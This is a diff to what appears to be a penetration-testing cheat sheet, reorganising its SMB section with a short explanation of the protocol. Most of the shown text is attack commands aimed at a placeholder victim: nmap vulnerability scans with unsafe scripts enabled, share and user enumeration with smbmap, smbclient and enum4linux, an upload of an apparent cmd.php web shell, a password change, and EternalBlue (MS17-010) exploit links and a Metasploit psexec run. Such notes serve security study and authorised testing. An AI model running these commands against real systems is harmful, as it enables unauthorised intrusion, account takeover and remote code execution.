@@ -674,6 +674,8 @@ nmap -sU --open -p 161, [victim_ip]
 
 # SMTP
 
+-------------------------------------------------------------------------------------------------------------------------------------
+
 - Waht is SMTP
 It is utilised to handle the sending of emails. In order to support email services, a protocol pair is required, comprising of SMTP and POP/IMAP
 
@@ -772,8 +774,64 @@ telnet [victim_ip] [pop3_port]
 # SMB
 
 --------------------------------------------------------------------------------------------------------------------------------
-SMB - Server message protocl - is's protocol for sharing files and resources, printers.. on a network.
+## What the SMB protocol is
+
+SMB - Server Message Protocol - is a protocol for sharing files and resources, printers.. on a network.
 Servers make file systems and other resources (printers, named pipes, APIs) available to clients on the network.
+
+The SMB protocol is known as a response-request protocol, meaning that it transmits multiple messages between the client and server to establish a connection. Clients connect to servers using TCP/IP (actually NetBIOS over TCP/IP as specified in RFC1001 and RFC1002), NetBEUI or IPX/SPX.
+
+## How does SMB work?
+
+Once they have established a connection, clients can then send commands (SMBs) to the server that allow them to access shares, open files, read and write files, and generally do all the sort of things that you want to do with a file system. However, in the case of SMB, these things are done over the network.
+
+## SMB Enumeration
+
+- SMB nmap scan
+```
+nmap -v -p 139,445 --script=smb-os-discovery [victim_ip]
+nmap -v -sSVC -p 139,445 --script discovery [victim_ip]
+nmap --script smb-enum-shares -p 139,445 [victim_ip]
+nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse [victim_ip]
+nmap -p 445 -vv --script=smb-enum-shares.nse,smb-enum-users.nse [victim_ip]
+nmap -sV -p 139,445 --script=smb-vuln-* --script-args=unsafe=1 [victim_ip]
+```
+
+- SMBmap tool
+```
+ smbmap -H <victim_ip>
+ smbmap -H <victim_ip> -R
+ smbmap -H <victim_ip> -u login -p password
+ smbmap -H <victim_ip> -u anonymous -d directory
+```
+
+- SMBclient tool
+```
+ smbclient \\\\[victim_ip]\\[sharename]
+ smbclient -N -L \\\\\[victim_ip]
+ smbclient -N -L //[victim_ip]/directory
+ smbclient //[victim_ip]/"[victim_folder]" -m NT1 --option="client min protocol=NT1"
+ smbclient -L <victim_ip> -U user_name
+ smbclient //<victim_ip/<resources> -U "user_login"
+ smbclient -U 'user%password' //<victim_ip>/resources
+ 
+- File upload via smbclient
+smbclient -N //<victim_ip>/<folder> -c 'put cmd.php cmd.php'
+```
+
+- enum4linux
+```
+- Share Enumeration:
+  enum4linux-S [victim_ip]
+  
+- Usernames Enumeration:
+  enum4linux -U -P [victim_ip]
+
+- All Enumeration:  
+  enum4linux -a [victim_ip]
+  enum4linux -a  [victim_ip]
+  enum4linux -u 'guest' -p '' -a  [victim_ip]
+```
 
 #### Nmblookup
 nmblookup is used to query NetBIOS names and map them to IP addresses in a network
@@ -782,14 +840,6 @@ using NetBIOS over TCP/IP queries.
 nmblookup -A <ip>
 ```
 
-#### smb_nmap
-
-- nmap -v -p 139,445 --script=smb-os-discovery [victim_ip]
-- nmap -v -sSVC -p 139,445 --script discovery [victim_ip]
-- nmap --script smb-enum-shares -p 139,445 [victim_ip]
-- nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse [victim_ip]
-- nmap -p 445 -vv --script=smb-enum-shares.nse,smb-enum-users.nse [victim_ip]
-- nmap -sV -p 139,445 --script=smb-vuln-* --script-args=unsafe=1 [victim_ip]
 
 #### rpcclient
 - rpcclient -U "" -N [victim_ip]
@@ -822,47 +872,29 @@ querygroup <rid_number>
 scan NetBIOS name servers open on a local or remote TCP/IP network 
 - nbtscan -r [victim_ip]
 
-#### smbmap
-  - smbmap -H <victim_ip>
-  - smbmap -H <victim_ip> -R
-  - smbmap -H <victim_ip> -u login -p password
-  - smbmap -H <victim_ip> -u anonymous -d directory
-  
-## smbclinet
-  - smbclient \\\\[victim_ip]\\[sharename]
-  - smbclient -N -L \\\\\[victim_ip]
-  - smbclient -N -L //[victim_ip]/directory
-  - smbclient //[victim_ip]/"[victim_folder]" -m NT1 --option="client min protocol=NT1"
-  - smbclient -L <victim_ip> -U user_name
-  - smbclient //<victim_ip/<resources> -U "user_login"
-  - smbclient -U 'user%password' //<victim_ip>/resources
  
  ### smb password change
 ```
 smbpasswd -r <victim_ip -U <user_name>
 ```
 
-### smbclinet_file_upload
-```
-smbclient -N //<victim_ip>/<folder> -c 'put cmd.php cmd.php'
-```
- 
-#### enum4linux
-  - Share Enumeration:
-    - enum4linux-S [victim_ip]
-  - Usernames Enumeration:
-    - enum4linux -U -P [victim_ip]
-  - All Enumeration:  
-    - enum4linux -a [victim_ip]
-  - enum4linux -a  [victim_ip]
-  - enum4linux -u 'guest' -p '' -a  [victim_ip]
-  
-#### eternalblue
+## Eternalblue
 
-### mmap_script:
+# What is a Eternalblue
+
+- Eternalblue mmap scan:
 ```
 nmap -v --script vuln [victim_ip] -p 445,139
 nmap -sV -script smb-vuln-ms17-010.nse [victim_ip] -p 139,44
+```
+
+- Eternalblue scripts
+```
+https://github.com/worawit/MS17-010
+https://github.com/3ndG4me/AutoBlue-MS17-010
+https://github.com/sailay1996/eternal-pulsar
+https://gist.github.com/thel3l/993f8ed81a56e10525dd4812ad01ff2a
+https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/
 ```
 
 #### crackmapexec
@@ -890,13 +922,6 @@ use exploit/windows/smb/ms17_010_psexec
 set rhosts [victim_ip]
 run
 ```
-
-### tools_for_eternalblue
-- https://github.com/worawit/MS17-010
-- https://github.com/3ndG4me/AutoBlue-MS17-010
-- https://github.com/sailay1996/eternal-pulsar
-- https://gist.github.com/thel3l/993f8ed81a56e10525dd4812ad01ff2a
-- https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/
     
 ## msfconsole
   - set rhosts 192.168.55.248
